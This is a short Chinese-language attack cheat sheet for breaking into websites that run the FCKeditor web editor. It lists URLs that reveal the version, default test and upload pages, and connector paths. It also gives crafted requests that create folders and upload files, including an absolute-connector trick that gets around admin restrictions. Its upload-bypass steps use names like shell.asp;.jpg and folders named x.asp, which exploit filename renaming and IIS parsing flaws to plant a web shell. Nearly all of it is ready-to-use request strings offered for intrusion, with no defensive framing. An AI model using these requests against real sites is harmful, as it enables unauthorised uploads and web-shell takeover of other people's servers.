# FCKeditor编辑器渗透思路

### 1.查看FCKeditor版本

```
http://127.0.0.1/fckeditor/editor/dialog/fck_about.html
http://127.0.0.1/FCKeditor/_whatsnew.html
```

### 2.一些FCK默认链接(以asp为例)：

```html
上传测试页面：Fckeditor编辑器默认会存在test.html和uploadtest.html文件，直接访问这些文件可以获取当前文件夹文件名称以及上传文件，有的版本可以直接上传任意文件类型，测试上传地址有：
FCKeditor/editor/filemanager/browser/default/connectors/test.html
FCKeditor/editor/filemanager/upload/test.html
FCKeditor/editor/filemanager/connectors/test.html
FCKeditor/editor/filemanager/connectors/uploadtest.html

示例页面：
FCKeditor/_samples/default.html
FCKeditor/_samples/asp/sample01.asp
FCKeditor/_samples/asp/sample02.asp
FCKeditor/_samples/asp/sample03.asp
FCKeditor/_samples/asp/sample04.asp

连接器：
FCKeditor/editor/filemanager/connectors/asp/connector.asp
FCKeditor/editor/filemanager/connectors/aspx/connector.aspx

创建文件夹链接：
FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/&NewFolderName=test

上传页面：
Fckeditor/editor/filemanager/browser/default/browser.html?Type=file&Connector=connectors/asp/connector.Asp
Fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/asp/connector.asp
FCKeditor/editor/filemanager/browser/default/browser.html?Type=all&Connector=connectors/asp/connector.asp
FCKeditor/editor/filemanager/browser/default/browser.html?Type=/&Connector=connectors/asp/connector.asp
FCKeditor/editor/filemanager/browser/default/browser.html?Type=monyer&Connector=connectors/asp/connector.asp

有时候，网站管理员会把上传页面禁止创建文件夹和上传文件，但是由于网站管理员的配置不当，我们的连接器写绝对路径的话，有时候可以创建文件夹和上传文件
Fckeditor/editor/filemanager/browser/default/browser.html?Type=file&Connector=http://ww.xxx.com/connectors/asp/connector.Asp
Fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://ww.xxx.com/connectors/asp/connector.asp
Fckeditor/editor/filemanager/browser/default/browser.html?Type=Flash&Connector=http://ww.xxx.com/connectors/asp/connector.asp
```

### 3.上传绕过

检测文件名中的‘.’修改为‘_’，绕过方式：

1.在上传了诸如*shell.asp;.jpg*的文件后，会自动将文件名改为*shell_asp;.jpg*。可以继续上传同名文件，文件名会变为*shell.asp;(1).jpg*

2.配合web服务器解析漏洞等文件上传漏洞

3.突破建立文件夹：

FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/&NewFolderName=test

FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/xx.asp&NewFolderName=x.asp

### 

